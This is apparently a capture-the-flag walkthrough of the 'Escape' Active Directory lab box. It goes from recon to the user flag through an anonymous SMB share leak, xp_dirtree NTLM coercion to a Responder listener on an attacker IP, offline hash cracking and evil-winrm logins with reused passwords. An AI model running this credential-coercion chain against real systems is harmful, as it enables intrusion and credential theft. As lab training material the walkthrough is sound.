## Overview

Escape is a medium-difficulty Windows Active Directory box. The path to user is a classic enumeration chain: an anonymous SMB share hands out an onboarding PDF containing temporary MSSQL credentials, those credentials let you coerce the SQL service into authenticating to your machine (capturing a crackable hash), and a leftover SQL error log leaks a second user's password through a login typo. This post covers recon through the user flag.

Highly realistic AD enumeration chain — guest SMB PDF leak, xp_dirtree NTLM coercion to Responder, hash crack, and an error-log password typo reused — with no CVE and almost no bespoke tooling.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | AD domain controller |
| 135/139/445 | RPC / SMB | netbios, signing required |
| 389/636/3268/3269 | LDAP / LDAPS | Domain `sequel.htb`, host `dc.sequel.htb` |
| 1433/tcp | MSSQL | SQL Server 2019 |
| 5985/tcp | WinRM | Microsoft HTTPAPI |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.202 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.202
```

The LDAP/cert output reveals two hostnames — the domain `sequel.htb` and the DC `dc.sequel.htb`. Add them to `/etc/hosts`. Note the ~8h clock skew; Kerberos will need clock sync later.

```bash
echo "10.10.11.202 sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

## Enumeration

There is no website, so start with SMB. Guest access (blank password) lists the shares:

```bash
smbclient -L \\\\sequel.htb\\ -N
```

Everything is standard except a share named `Public`. Connecting to it (again with a blank password) reveals a single file:

```bash
smbclient \\\\sequel.htb\\public -N -c 'ls; get "SQL Server Procedures.pdf"'
```

`SQL Server Procedures.pdf` is an onboarding document. Buried in a "Bonus" note is a temporary credential pair for the database, meant for new hires before their own accounts are provisioned:

- User: `PublicUser`
- Password: `GuestUserCantWrite1`

## Foothold

**1 — Log into MSSQL.** The leaked credentials work against the SQL Server on port 1433:

```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

Nothing interesting is reachable in the databases directly. The useful trick is to make the SQL *service* authenticate to us.

**2 — Coerce NTLM authentication with `xp_dirtree`.** `xp_dirtree` walks a directory path — including a UNC path pointing at our own machine. Stand up Responder, then issue the stored proc from the SQL prompt:

```bash
sudo responder -I tun0 -v
```

```sql
EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1
```

The SQL service reaches out over SMB and Responder captures the NetNTLMv2 hash for the account it runs as: `sql_svc`.

**3 — Crack the hash.** `sql_svc` is an ordinary user account, so the hash is crackable offline:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# -> REGGIE1234ronnie (sql_svc)
```

**4 — WinRM shell.** With cleartext creds, log in over WinRM:

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

`whoami` confirms `sequel\sql_svc`.

## Lateral Movement to ryan.cooper

`sql_svc` cannot read the user flag — `C:\Users` shows the flag belongs to `Ryan.Cooper`. Enumerating the filesystem turns up a backup of the MSSQL error log:

```powershell
type C:\sqlserver\Logs\ERRORLOG.bak
```

The log records a failed login for `sequel.htb\Ryan.Cooper`, immediately followed by a failed login whose **username** is `NuclearMosquito3` — Ryan typed his password into the username field. Users reuse passwords, so try it against his account over WinRM:

```bash
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

`whoami` returns `sequel\ryan.cooper`.

## User flag

```powershell
type C:\Users\Ryan.Cooper\Desktop\user.txt
# [redacted]
```

The user flag is ours. Privilege escalation runs through an ADCS ESC1 template (`UserAuthentication`) that lets any authenticated user request a certificate as the Administrator — but that is beyond the scope of this post, which stops at user.

Privilege escalation is left as an exercise — this post stops at user.
